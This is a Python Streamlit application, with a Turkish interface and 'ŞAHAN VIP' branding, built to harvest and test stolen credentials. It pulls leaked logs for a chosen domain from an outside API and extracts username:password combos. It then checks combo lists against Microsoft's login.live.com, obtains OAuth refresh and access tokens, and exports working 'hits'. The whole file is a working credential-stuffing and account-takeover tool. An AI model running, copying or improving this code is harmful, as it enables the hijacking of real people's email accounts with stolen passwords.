import csv
from datetime import datetime
import json
import random
import re
import urllib.parse
import requests
import streamlit as st

# ================= PAGE CONFIG =================
st.set_page_config(
    page_title="ŞAHAN VIP - Log & Hotmail Suite", page_icon="⚡", layout="wide"
)

# ================= CUSTOM CSS =================
st.markdown(
    """
    <style>
    .stApp { background-color: #08090c; color: #d1d5db; }
    .card { background-color: #0f111a; border: 1px solid #1f222e; border-radius: 8px; padding: 15px; margin-bottom: 10px; }
    h1, h2, h3 { color: #ef4444; }
    </style>
""",
    unsafe_allow_html=True,
)

BASE_API_URL = "https://solidarksystems.alwaysdata.net/log.php?url="


# ================= PARSE MOTORU (Log Extractor) =================
class LogParser:

  @staticmethod
  def parse_log(response_text):
    combos = []
    lines_to_check = []
    try:
      data = json.loads(response_text)

      def extract_values(obj):
        if isinstance(obj, dict):
          for k, v in obj.items():
            extract_values(v)
        elif isinstance(obj, list):
          for item in obj:
            extract_values(item)
        elif isinstance(obj, str):
          lines_to_check.extend(obj.split("\n"))

      extract_values(data)
    except:
      pass

    raw_lines = (
        response_text.replace("<br>", "\n").replace("<br/>", "\n").split("\n")
    )
    lines_to_check.extend(raw_lines)

    blacklist = {
        "host",
        "user-agent",
        "accept",
        "referer",
        "origin",
        "cookie",
        "date",
        "server",
        "content-type",
        "connection",
        "pragma",
        "cache-control",
        "authorization",
        "aranan_domain",
        "bulunan_kayit_sayisi",
        "auth",
        "sonuclar",
    }

    for line in lines_to_check:
      line = line.strip()
      if not line:
        continue
      line = re.sub(r'^[\[\]{}"\']+|[\[\]{}"\']+$', "", line).strip()
      if "://" in line:
        parts = line.split("://", 1)
        if len(parts) > 1:
          rem = parts[1]
          if ":" in rem:
            last_colon_idx = rem.rfind(":")
            if last_colon_idx != -1:
              sub_str = rem[:last_colon_idx]
              user_colon_idx = sub_str.rfind(":")
              if user_colon_idx != -1:
                u = sub_str[user_colon_idx + 1 :].strip().strip("\"'/\\")
                p = rem[last_colon_idx + 1 :].strip().strip("\"'/\\")
                if (
                    len(u) > 1
                    and len(p) > 0
                    and u.lower() not in blacklist
                ):
                  combos.append((u, p))
                  continue

      if ":" in line and "://" not in line:
        parts = line.split(":", 1)
        u = parts[0].strip().strip("\"'{},[]<>")
        p = parts[1].strip().strip("\"'{},[]<>")
        if (
            len(u) > 1
            and len(p) > 0
            and u.lower() not in blacklist
            and len(u.split()) < 3
        ):
          combos.append((u, p))

    return list(dict.fromkeys(combos))


# ================= HOTMAIL CHECKER MOTORU =================
class LoginError(Exception):
  pass


class HotmailChecker:

  def __init__(self, email: str, password: str, keywords: list = None):
    self.email = email
    self.password = password
    self.keywords = keywords if keywords else []
    self.session = requests.Session()
    self.ua = (
        "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv)"
        " AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0"
        " Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0"
    )
    self.session.headers.update(
        {"User-Agent": self.ua, "Accept-Language": "en-US,en;q=0.9"}
    )
    self.code = None
    self.refresh_token = None
    self.access_token = None
    self.substrate_token = None
    self.cid = None
    self.captures = {}
    self.coid = "3d0f0eea-617a-4b9c-a747-100934dca583"

  @staticmethod
  def url_encode(text: str) -> str:
    return urllib.parse.quote(text, safe="")

  def get_cookie_string(self) -> str:
    return "; ".join(f"{c.name}={c.value}" for c in self.session.cookies)

  def extract_code(self, text: str) -> str | None:
    match = re.search(r"[?&]code=([^&#\s\"']+)", text)
    if match:
      return urllib.parse.unquote(match.group(1))
    match = re.search(r'"code"\s*:\s*"([^"]+)"', text)
    if match:
      return match.group(1)
    return None

  def login(self) -> bool:
    us = self.url_encode(self.email)
    ps = self.url_encode(self.password)
    login_url = (
        "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0&opid=EED8E3DBCC1AAA6A&bk=1726223182&uaid=3d0f0eea617a4b9ca747100934dca583&pid=15216"
    )
    payload = f"login={us}&loginfmt={us}&type=11&LoginOptions=1&passwd={ps}"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "login.live.com",
        "Origin": "https://login.live.com",
        "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2",
        "User-Agent": self.ua,
    }

    try:
      resp = self.session.post(
          login_url,
          data=payload,
          headers=headers,
          allow_redirects=True,
          timeout=15,
      )
      text = resp.text
      url = str(resp.url)

      if "Sign in to your Microsoft account" in text:
        raise LoginError("BAD")
      if any(
          k in text
          for k in [
              "account.live.com/recover",
              "account.live.com/identity/confirm",
          ]
      ):
        raise LoginError("2FA")

      self.code = self.extract_code(url) or self.extract_code(text)
      if not self.code and "access_token" not in text:
        raise LoginError("BAD")

      cid = self.session.cookies.get("MSPCID", "")
      self.cid = cid.upper() if cid else None
      return True
    except LoginError as le:
      raise le
    except:
      raise LoginError("BAD")

  def exchange_code_for_tokens(self) -> bool:
    if not self.code:
      return False
    url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
    data = f"client_info=1&client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&grant_type=authorization_code&code={self.code}&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
    try:
      resp = self.session.post(
          url,
          data=data,
          headers={
              "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
          },
          timeout=15,
      )
      j = resp.json()
      self.refresh_token = j.get("refresh_token")
      self.access_token = j.get("access_token")
      return bool(self.refresh_token and self.access_token)
    except:
      return False

  def run(self) -> tuple[str, dict, dict]:
    try:
      self.login()
      if self.exchange_code_for_tokens():
        return "HIT", self.captures, {}
      return "FREE", self.captures, {}
    except LoginError as e:
      return str(e), {}, {}
    except:
      return "BAD", {}, {}


# ================= SIDEBAR =================
st.sidebar.markdown(
    "<h1 style='color: #ef4444; font-size: 24px;'>ŞAHAN</h1>",
    unsafe_allow_html=True,
)
st.sidebar.markdown(
    "<p style='color: #06b6d4; font-size: 11px; font-weight: bold;'>VIP LOG"
    " & HOTMAIL SUITE</p>",
    unsafe_allow_html=True,
)

menu = st.sidebar.radio(
    "Menü", ["⚡ Tekli URL Taraması", "✉️ Hotmail Checker", "🔍 Raw API Konsolu"]
)

# ================= UYGULAMA SAYFALARI =================
if menu == "⚡ Tekli URL Taraması":
  st.markdown("## ŞAHAN VIP - Tekli URL Taraması")
  target = st.text_input(
      "ŞAHAN Hedef Domain Girin", placeholder="Örn: zulaoyun.com"
  )

  if st.button("🚀 Comboları Ayıkla", use_container_width=True):
    if target:
      with st.spinner(f"🌐 Bağlanılıyor: {target}..."):
        try:
          res = requests.get(BASE_API_URL + target, timeout=15)
          if res.status_code == 200:
            parsed = LogParser.parse_log(res.text)
            st.session_state["combos"] = parsed
            st.session_state["raw_text"] = res.text
            st.success(f"⚡ Tarama bitti. Ayıklanan combo: {len(parsed)}")
          else:
            st.error(f"HTTP Hatası: {res.status_code}")
        except Exception as e:
          st.error(f"Hata: {str(e)}")

  combos = st.session_state.get("combos", [])
  if combos:
    import pandas as pd

    df = pd.DataFrame(combos, columns=["Kullanıcı / E-Posta", "Şifre"])
    st.dataframe(df, use_container_width=True)
    combo_text = "\n".join([f"{u}:{p}" for u, p in combos])
    st.download_button(
        "📋 Comboları İndir",
        combo_text,
        file_name="sahan_combos.txt",
        mime="text/plain",
    )

elif menu == "✉️ Hotmail Checker":
  st.markdown("## ŞAHAN VIP - Hotmail / Outlook Checker")
  combo_input = st.text_area(
      "Combo Listesi (email:sifre)",
      placeholder="ornek@hotmail.com:sifre123",
      height=200,
  )

  if st.button("🔍 Hotmail Hesaplarını Kontrol Et", use_container_width=True):
    lines = [line.strip() for line in combo_input.split("\n") if line.strip()]
    hits = []
    frees = []
    bads = []

    progress_bar = st.progress(0)
    status_box = st.empty()

    total = len(lines)
    for i, line in enumerate(lines):
      if ":" in line:
        email, password = line.split(":", 1)
        status_box.text(f"Kontrol ediliyor: {email}")
        try:
          checker = HotmailChecker(email, password)
          status, _, _ = checker.run()
          if status == "HIT":
            hits.append((email, password))
          elif status == "FREE":
            frees.append((email, password))
          else:
            bads.append((email, password))
        except:
          bads.append((email, password))

      if total > 0:
        progress_bar.progress((i + 1) / total)

    status_box.text("Kontrol tamamlandı!")
    st.success(
        f"✅ Sonuçlar -> Hit: {len(hits)} | Free: {len(frees)} | Bad:"
        f" {len(bads)}"
    )

    if hits or frees:
      import pandas as pd

      all_hits = hits + frees
      df = pd.DataFrame(all_hits, columns=["Email", "Şifre"])
      st.dataframe(df, use_container_width=True)
      hit_text = "\n".join([f"{e}:{p}" for e, p in all_hits])
      st.download_button(
          "📋 Çalışanları İndir (TXT)",
          hit_text,
          file_name="hotmail_hits.txt",
          mime="text/plain",
      )

elif menu == "🔍 Raw API Konsolu":
  st.markdown("## ŞAHAN Log Viewer - API Ham Verisi")
  raw_text = st.session_state.get("raw_text", "Henüz veri çekilmedi.")
  st.text_area("Ham Yanıt", raw_text, height=500)
